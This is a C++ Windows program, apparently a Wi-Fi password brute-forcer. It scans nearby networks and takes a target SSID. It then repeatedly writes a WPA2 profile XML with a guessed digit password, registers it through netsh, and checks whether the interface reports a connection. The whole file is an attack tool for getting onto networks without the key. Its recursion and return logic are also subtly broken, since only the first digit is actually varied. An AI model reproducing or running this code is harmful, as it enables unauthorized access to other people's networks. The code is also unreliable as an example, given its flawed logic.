#include <iostream>
#include<stdlib.h>
#include<fstream>
#include<string>
#include<conio.h>
#include <QDebug>

using namespace std;

ofstream xmlFile;
ifstream xmlFile1;

string name="";
char pass[10] = {};
string ntyp="Wi-Fi 2",fileTest=">test.txt",check,ntype,fil,fileName="myWlan.xml";
char c='"',cho='2',cho1='1',c1;
string netType="\"Wi-Fi 2\" > test.txt";
string xfileName="\"myWlan.xml\"";
int succ=0;


int checkFinal(char pass[])
{
       cout<<"\n    Enter wifi Password------:        ";
       qDebug() << "PASS: " << QString(pass);
        xmlFile.open(fileName.c_str());

        //Writing a xml file .....................

        xmlFile<<"<?xml version="<<c<<"1.0"<<c<<"?>\n";
        xmlFile<<"<WLANProfile xmlns="<<c<<"http://www.microsoft.com/networking/WLAN/profile/v1"<<c<<">\n";
        xmlFile<<"<name>";
        xmlFile<<name;
        xmlFile<<"</name>\n<SSIDConfig>\n<SSID>\n<hex>";
        for(int i=0;i<name.length();i++)
        xmlFile<<hex<<(int)name.at(i);
        xmlFile<<"</hex>\n<name>";
        xmlFile<<name;
        xmlFile<<"</name>\n</SSID>\n</SSIDConfig>\n<connectionType>ESS</connectionType>\n<connectionMode>auto</connectionMode>\n<MSM>\n<security>\n<authEncryption>";
        xmlFile<<"\n<authentication>WPA2PSK</authentication>\n<encryption>AES</encryption>\n<useOneX>false</useOneX>\n</authEncryption>\n<sharedKey>";
        xmlFile<<"\n<keyType>passPhrase</keyType>\n<protected>false</protected>\n<keyMaterial>";
        xmlFile<<pass;
        xmlFile<<"</keyMaterial>\n</sharedKey>\n</security>\n</MSM>\n";
        xmlFile<<"<MacRandomization xmlns="<<c<<"http://www.microsoft.com/networking/WLAN/profile/v3"<<c<<">\n";
        xmlFile<<"<enableRandomization>false</enableRandomization>\n</MacRandomization>\n</WLANProfile>";
        xmlFile.close();

        //addd the xml file to system profile.............
        system(("netsh wlan add profile filename="+xfileName).c_str());
        //to let system realize what changes have been made...............
        system("timeout /t 3");
        //to check if connected...........
        system(("netsh interface show interface name="+netType).c_str());

        xmlFile1.open("test.txt");
        while(!xmlFile1.eof())
        {
             xmlFile1>>c1;
             if(c1==':')
             {
                  for(int i=0;i<9;i++)
                  {
                       xmlFile1>>c1;
                       check=check+c1;
                   }
             }
                  if(check=="Connected")
                  {
                      cout<<"...............................................You are connected!!.................................";
                      succ=1;break;
                  }
                  if(check!="Connected")check="";
        }
        xmlFile1.close();
            if(succ==1)
                return 1;
}

int checkPass(int dex)
{
    for(int i = 0; i < 10; i++)
    {
        pass[dex] = i + '0';
        if(dex == 0)
        {
            int a = checkFinal(pass);
            if(a == 1)
            {
                return 100;
            }
        }
        else{
            int a = checkPass(dex + 1);
            if(a == 100)
                return 100;
        }
    }
}


int main()
{

    pass[8] = '\0';
    pass[7] = '1';
    pass[6] = '9';
    pass[5] = '9';
    pass[4] = '1';
    pass[3] = '3';
    pass[2] = '0';
    pass[1] = '6';
 do
 {
      system("netsh wlan show networks");
      cout<<"   >--------------------         TO REFRESS PRESS :1       \n\n   >--------------------         TO CHOOSE NETWORK PRESS : 2              \n\n   >   ";
      cho=getch();
}while(cho!='2');

cout<<"\n    Enter the desired network name-------:       ";
cin>>name;

checkPass(0);

    return 0;
}
